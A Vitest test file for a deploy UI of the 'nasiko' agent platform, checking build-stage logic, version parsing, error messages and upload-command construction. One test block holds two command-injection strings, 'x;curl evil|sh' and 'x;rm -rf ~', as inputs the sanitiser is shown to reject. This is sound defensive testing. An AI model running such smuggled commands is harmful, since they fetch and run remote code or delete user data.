// @vitest-environment node
import { describe, expect, it } from 'vitest'
import { fmtBytes } from '@/lib/format'
import uploadHelp from './__fixtures__/nasiko-upload-help.txt?raw'
import { copy } from './copy'
import { explainError, failureReason } from './errors'
import { filterRepos } from './github'
import { uploadCommand } from './name'
import { buildSource, deriveBuild, fmtElapsed, repoOf, STAGES } from './steps'
import { nextPatch, parseVersion, parseVersionConflict, versionFromConflictText } from './version'

const states = (v: ReturnType<typeof deriveBuild>) => v.stages.map((s) => s.state)

describe('deriveBuild (plans/feat-deploy.md §5)', () => {
  it('walks queued → building → deploying → running', () => {
    expect(states(deriveBuild({ status: 'queued' }))).toEqual([
      'current',
      'pending',
      'pending',
      'pending',
    ])
    expect(states(deriveBuild({ status: 'building' }))).toEqual([
      'done',
      'current',
      'pending',
      'pending',
    ])
    // The upload reached the deploy while the build row still says building.
    expect(
      deriveBuild({ status: 'building', upload: { status: 'orchestration_processing' } }).current,
    ).toBe('deploying')
    // Image built, agent not up yet: still deploying, not terminal.
    const deploying = deriveBuild({ status: 'success', agentStatus: 'deploying' })
    expect(deploying).toMatchObject({
      current: 'deploying',
      outcome: null,
      terminal: false,
      badge: 'building',
    })
    const running = deriveBuild({ status: 'success', agentStatus: 'running' })
    expect(states(running)).toEqual(['done', 'done', 'done', 'done'])
    expect(running).toMatchObject({ outcome: 'running', terminal: true, badge: 'running' })
    // A completed upload means deployed, even before the directory refreshes.
    expect(deriveBuild({ status: 'success', upload: { status: 'completed' } }).outcome).toBe(
      'running',
    )
  })

  it('marks the failing stage: the build (or clone), or the deploy when the upload got that far', () => {
    expect(states(deriveBuild({ status: 'failed' }))).toEqual([
      'done',
      'failed',
      'pending',
      'pending',
    ])
    expect(
      states(deriveBuild({ status: 'failed', upload: { status: 'orchestration_triggered' } })),
    ).toEqual(['done', 'done', 'failed', 'pending'])
    expect(deriveBuild({ status: 'failed' })).toMatchObject({
      outcome: 'failed',
      terminal: true,
      badge: 'failed',
    })
  })

  it('lets a finished upload row outrank a stale in-progress build status (newest wins)', () => {
    expect(deriveBuild({ status: 'building', upload: { status: 'completed' } }).outcome).toBe(
      'running',
    )
    expect(deriveBuild({ status: 'queued', upload: { status: 'failed' } }).outcome).toBe('failed')
    // A settled build status is kept.
    expect(deriveBuild({ status: 'failed', upload: { status: 'completed' } }).outcome).toBe(
      'failed',
    )
  })

  it('says "Built, but not running" when the image built but the agent went down', () => {
    for (const agentStatus of ['failed', 'crashed', 'stopped']) {
      const v = deriveBuild({ status: 'success', agentStatus })
      expect(v).toMatchObject({ outcome: 'notRunning', terminal: true, badge: 'notRunning' })
      expect(v.stages.at(-1)!.state).toBe('warning')
    }
  })

  it('falls back to the upload row when the stream says not_found (a failed first upload deletes its build, D-4)', () => {
    expect(deriveBuild({ status: 'not_found', upload: { status: 'failed' } }).outcome).toBe(
      'failed',
    )
    expect(deriveBuild({ status: null, upload: { status: 'initiated' } }).current).toBe('queued')
    expect(deriveBuild({ status: null, upload: { status: 'processing' } }).current).toBe('building')
    expect(deriveBuild({ status: 'not_found', upload: null })).toMatchObject({
      current: null,
      outcome: null,
      terminal: false,
    })
  })

  it('labels every stage and badge in copy', () => {
    expect(deriveBuild({ status: 'queued' }).stages.map((s) => s.label)).toEqual(
      STAGES.map((s) => copy.steps[s]),
    )
  })
})

describe('fmtElapsed', () => {
  it('shows whole seconds, then minutes, then hours', () => {
    expect(fmtElapsed(47_900)).toBe('47 s')
    expect(fmtElapsed(72_000)).toBe('1 m 12 s')
    expect(fmtElapsed(3_900_000)).toBe('1 h 05 m')
    expect(fmtElapsed(-5)).toBe('0 s')
  })
})

describe('buildSource', () => {
  it('names a GitHub repo with its short commit, else a zip upload', () => {
    expect(
      buildSource({ github_url: 'https://github.com/acme/bot.git', commit_hash: 'deadbeefcafe' }),
    ).toBe('acme/bot@deadbee')
    expect(buildSource({ github_url: 'https://github.com/acme/bot', commit_hash: null })).toBe(
      'acme/bot',
    )
    expect(buildSource({ github_url: null, commit_hash: null })).toBe(copy.source.upload)
  })
})

describe('version helpers', () => {
  it('parses strict x.y.z and bumps the patch', () => {
    expect(parseVersion('1.2.3')).toEqual({ major: 1, minor: 2, patch: 3 })
    for (const bad of ['1.2', 'v1.2.3', '1.2.3-rc1', '', null, undefined])
      expect(parseVersion(bad)).toBeNull()
    expect(nextPatch('1.2.9')).toBe('1.2.10')
    expect(nextPatch('nope')).toBeNull()
  })

  it('reads github.rs VERSION_CONFLICT and ignores malformed ones', () => {
    expect(
      parseVersionConflict(
        'VERSION_CONFLICT:1.1.0:1.1.1:bot version 1.1.0 already exists and versions are immutable',
      ),
    ).toEqual({
      version: '1.1.0',
      suggested: '1.1.1',
      message: 'bot version 1.1.0 already exists and versions are immutable',
    })
    expect(parseVersionConflict('VERSION_CONFLICT:latest:1.1.1:x')).toBeNull()
    expect(parseVersionConflict('VERSION_CONFLICT:1.1.0')).toBeNull()
    expect(parseVersionConflict('upload and deploy failed')).toBeNull()
  })

  it("reads the upload 409's version", () => {
    expect(
      versionFromConflictText(
        "version 2.0.1 already exists in this agent's history — choose a new version",
      ),
    ).toBe('2.0.1')
    expect(versionFromConflictText('agent name already in use by another owner')).toBeNull()
  })
})

describe('explainError (server strings at nasiko-cloud-rs 2d6178e4)', () => {
  const cases: [string, keyof typeof copy.errors | null, string | undefined][] = [
    ['no Dockerfile found in root of zip', 'noDockerfile', 'dockerfile'],
    ['Dockerfile has no FROM instruction', 'noFrom', 'dockerfile'],
    [
      'no Python entrypoint found (main.py, src/main.py, __main__.py, or src/__main__.py)',
      'noEntrypoint',
      'entrypoint',
    ],
    [
      'version_tag is required and must be in x.y.z format (or declare it in AgentCard.json)',
      'noVersion',
      'version',
    ],
    ['no valid version found — add a version', 'noVersion', 'version'],
    ['upload exceeds 100 MiB', 'tooLarge', 'size'],
    ['GitHub not connected', 'githubDisconnected', undefined],
    ['git clone failed', 'cloneFailed', undefined],
    ['upload and deploy failed', 'generic', undefined],
    ['internal error', 'generic', undefined],
  ]
  for (const [text, key, item] of cases) {
    it(`maps "${text}"`, () => {
      const e = explainError(text)
      expect(e.problem).toBe((copy.errors[key!] as { problem: string }).problem)
      expect(e.item).toBe(item)
    })
  }

  it('turns a version clash into a Deploy-as suggestion', () => {
    expect(explainError('VERSION_CONFLICT:1.1.0:1.1.1:taken')).toMatchObject({
      version: '1.1.0',
      suggested: '1.1.1',
    })
    expect(
      explainError("version 2.0.1 already exists in this agent's history — choose a new version"),
    ).toMatchObject({ version: '2.0.1', suggested: '2.0.2', item: 'version' })
  })

  it('gives a one-line reason for a Builds row, never raw server text', () => {
    expect(failureReason(['no Dockerfile found in root of zip'])).toBe(
      copy.errors.noDockerfile.problem,
    )
    expect(failureReason([])).toBe(copy.errors.generic.problem)
    expect(failureReason(null)).toBe(copy.errors.generic.problem)
  })
})

describe('fmtBytes', () => {
  it('uses binary units with one decimal below 10', () => {
    expect(fmtBytes(812)).toBe('812 B')
    expect(fmtBytes(2.4 * 1024 * 1024)).toBe('2.4 MB')
    expect(fmtBytes(98 * 1024 * 1024)).toBe('98 MB')
    expect(fmtBytes(3 * 1024 ** 3)).toBe('3.0 GB')
  })
})

describe('GitHub helpers', () => {
  const repo = (full_name: string, description: string | null = null) => ({
    id: 1,
    name: full_name.split('/')[1]!,
    full_name,
    description,
    private: false,
    html_url: '',
    default_branch: 'main',
    updated_at: '',
  })
  it('filters repositories by name or description, keeping the server order', () => {
    const all = [
      repo('acme/bot', 'Support'),
      repo('acme/web'),
      repo('other/tool', 'A support tool'),
    ]
    expect(filterRepos(all, 'SUPPORT').map((r) => r.full_name)).toEqual(['acme/bot', 'other/tool'])
    expect(filterRepos(all, '  ')).toHaveLength(3)
    expect(filterRepos(all, 'nope')).toEqual([])
  })
  it('reads owner/name from a GitHub URL', () => {
    expect(repoOf('https://github.com/acme/bot.git')).toBe('acme/bot')
    expect(repoOf('https://github.com/acme/bot/')).toBe('acme/bot')
  })
})

describe('the terminal alternative (plans/feat-deploy.md §7, recorded `nasiko upload --help`)', () => {
  it('passes the directory as the optional [SOURCE], with no required option', () => {
    expect(uploadHelp).toMatch(/Usage: nasiko upload \[OPTIONS\] \[SOURCE\]/)
    expect(uploadHelp).toMatch(/\[SOURCE\]\s+Agent directory or \.zip file/)
    expect(uploadCommand('support-bot')).toBe('nasiko upload ./support-bot')
    expect(uploadCommand('x').split(' ')).toHaveLength(3)
  })

  it('offers the options the Upload form sends (parity, §4.1)', () => {
    for (const flag of ['--name', '--version', '--port', '--env', '--writable', '--writable-path'])
      expect(uploadHelp).toContain(flag)
  })
})

describe('links and commands never carry shell characters (review D2)', () => {
  it('drops a ?name= the server would reject', async () => {
    const { deploySearchSchema } = await import('./search')
    expect(deploySearchSchema.parse({ name: 'x;curl evil|sh' }).name).toBeUndefined()
    expect(deploySearchSchema.parse({ name: 'support-bot' }).name).toBe('support-bot')
  })

  it('builds the upload command only from a valid name', () => {
    expect(uploadCommand('x;rm -rf ~')).toBe('nasiko upload ./my-agent')
    expect(uploadCommand('')).toBe('nasiko upload ./my-agent')
  })
})

describe('/ship review: client checks match the server (nasiko-cloud-rs 2d6178e4)', () => {
  it('parses versions like semver (no leading zeros)', () => {
    expect(parseVersion('1.02.3')).toBeNull()
    expect(parseVersion('01.2.3')).toBeNull()
    expect(parseVersion('0.10.0')).toEqual({ major: 0, minor: 10, patch: 0 })
  })

  it('names the zip limits the server enforces on the size item', () => {
    expect(explainError('zip contains 1204 files, limit is 1000')).toMatchObject({
      item: 'size',
      problem: copy.errors.tooBig.problem,
    })
    expect(explainError('zip uncompressed size exceeds 209715200 bytes')).toMatchObject({
      item: 'size',
    })
  })

  it('accepts a compose-style registry host (registry:5000) and still rejects owner/name without a host', async () => {
    const { parseReference } = await import('./registry')
    expect(parseReference('registry:5000/acme/bot:1.0.0')).toMatchObject({ host: 'registry:5000' })
    expect(parseReference('localhost/acme/bot')).toMatchObject({ host: 'localhost' })
    expect(parseReference('acme/bot/x')).toBeNull()
  })
})
